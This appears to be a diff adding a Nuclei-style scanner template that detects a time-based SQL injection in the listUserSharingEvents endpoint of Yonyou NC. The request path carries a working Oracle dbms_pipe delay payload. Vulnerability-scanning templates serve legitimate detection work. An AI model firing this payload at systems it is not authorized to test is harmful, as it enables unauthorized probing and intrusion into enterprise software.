@@ -1,0 +1,35 @@
+http:
+    - headers:
+        Accept: application/json, text/javascript, */*; q=0.01
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        X-Requested-With: XMLHttpRequest
+      matchers:
+        - condition: and
+          dsl:
+            - duration>=3 && duration<8
+            - status_code == 200
+          type: dsl
+        - condition: and
+          type: word
+          words:
+            - <share
+            - <?xml
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1'')+AND+1=dbms_pipe.receive_message(''RDS'',5)--&pageId=login&sch_ed=2&sch_sd=1'
+id: yonyou-nc-listusersharingevents-sqli
+info:
+    author: onewin
+    description: |
+        用友NC系统的listUserSharingEvents接口存在SQL注入漏洞
+    name: 用友NC系统的listUserSharingEvents接口存在SQL注入漏洞
+    reference: UFIDA-2025-059739
+    severity: high
+    tags:
+        - 用友-U8
+        - 用友-NC-Cloud
+        - Yonyou-UFIDA-NC
+        - Yonyou-U8-Cloud
+        - 用友-nc
+        - Yonyou-UFIDA
